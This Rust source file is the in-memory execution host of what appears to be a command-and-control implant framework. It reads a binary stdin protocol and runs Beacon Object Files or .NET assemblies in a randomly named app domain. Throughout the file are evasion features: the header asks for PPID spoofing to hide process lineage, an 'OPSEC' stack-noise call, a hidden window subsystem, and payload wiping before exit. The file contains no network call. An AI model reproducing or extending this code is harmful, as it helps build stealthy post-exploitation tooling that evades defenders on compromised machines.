//! Isolated execution host — runs BOF / .NET in **this** process only, then exits.
//!
//! Wire protocol on stdin (binary):
//!   magic "CIS1" (4)
//!   kind  u32le  (1=bof, 2=dotnet)
//!   pay_len u32le
//!   arg_len u32le
//!   payload[pay_len]
//!   args[arg_len]   // bof: raw beacon args; dotnet: UTF-8 args joined by \0 or JSON array as UTF-8
//!
//! stdout:
//!   out_len u32le
//!   err_len u32le
//!   stdout bytes
//!   stderr bytes
//!
//! No C2 network. Parent should PPID-spoof so this is not an Agent child in the tree.

#![windows_subsystem = "windows"]

use std::io::{Read, Write};

const MAGIC: &[u8; 4] = b"CIS1";
const KIND_BOF: u32 = 1;
const KIND_DOTNET: u32 = 2;

fn main() {
    let _ = std::panic::catch_unwind(|| {
        if let Err(e) = run() {
            let _ = write_result(b"", e.as_bytes());
        }
    });
}

fn run() -> Result<(), String> {
    let mut stdin = std::io::stdin();
    let mut hdr = [0u8; 16];
    stdin
        .read_exact(&mut hdr)
        .map_err(|e| format!("read hdr: {e}"))?;
    if &hdr[0..4] != MAGIC {
        return Err("bad magic".into());
    }
    let kind = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);
    let pay_len = u32::from_le_bytes([hdr[8], hdr[9], hdr[10], hdr[11]]) as usize;
    let arg_len = u32::from_le_bytes([hdr[12], hdr[13], hdr[14], hdr[15]]) as usize;
    if pay_len > 64 * 1024 * 1024 || arg_len > 4 * 1024 * 1024 {
        return Err("size limit".into());
    }
    let mut payload = vec![0u8; pay_len];
    if pay_len > 0 {
        stdin
            .read_exact(&mut payload)
            .map_err(|e| format!("read pay: {e}"))?;
    }
    let mut args_raw = vec![0u8; arg_len];
    if arg_len > 0 {
        stdin
            .read_exact(&mut args_raw)
            .map_err(|e| format!("read args: {e}"))?;
    }

    // OPSEC: tiny jitter
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        cupcake_core::stealth::stack::add_stack_noise();
    }

    let (stdout, stderr) = match kind {
        KIND_BOF => {
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .map_err(|e| e.to_string())?;
            match rt.block_on(async {
                cupcake_core::loader::bof::BofLoader::execute(&payload, &args_raw).await
            }) {
                Ok(o) => (o, String::new()),
                Err(e) => (String::new(), format!("bof: {e}")),
            }
        }
        KIND_DOTNET => {
            let args: Vec<String> = if args_raw.is_empty() {
                Vec::new()
            } else if let Ok(v) = serde_json::from_slice::<Vec<String>>(&args_raw) {
                v
            } else {
                String::from_utf8_lossy(&args_raw)
                    .split_whitespace()
                    .map(|s| s.to_string())
                    .collect()
            };
            let domain = format!(
                "App_{:x}",
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_nanos() as u32)
                    .unwrap_or(0)
            );
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .map_err(|e| e.to_string())?;
            let r = rt.block_on(async {
                cupcake_core::dotnet::DotNetExecutor::execute_assembly(
                    payload.clone(),
                    args,
                    Some(&domain),
                )
                .await
            });
            (r.stdout, r.stderr)
        }
        _ => (String::new(), format!("unknown kind {kind}")),
    };

    // Burn payload in this process before exit
    for b in payload.iter_mut() {
        *b = 0;
    }
    for b in args_raw.iter_mut() {
        *b = 0;
    }

    write_result(stdout.as_bytes(), stderr.as_bytes())
}

fn write_result(stdout: &[u8], stderr: &[u8]) -> Result<(), String> {
    let mut out = std::io::stdout();
    let ol = (stdout.len() as u32).to_le_bytes();
    let el = (stderr.len() as u32).to_le_bytes();
    out.write_all(&ol).map_err(|e| e.to_string())?;
    out.write_all(&el).map_err(|e| e.to_string())?;
    out.write_all(stdout).map_err(|e| e.to_string())?;
    out.write_all(stderr).map_err(|e| e.to_string())?;
    out.flush().map_err(|e| e.to_string())?;
    Ok(())
}
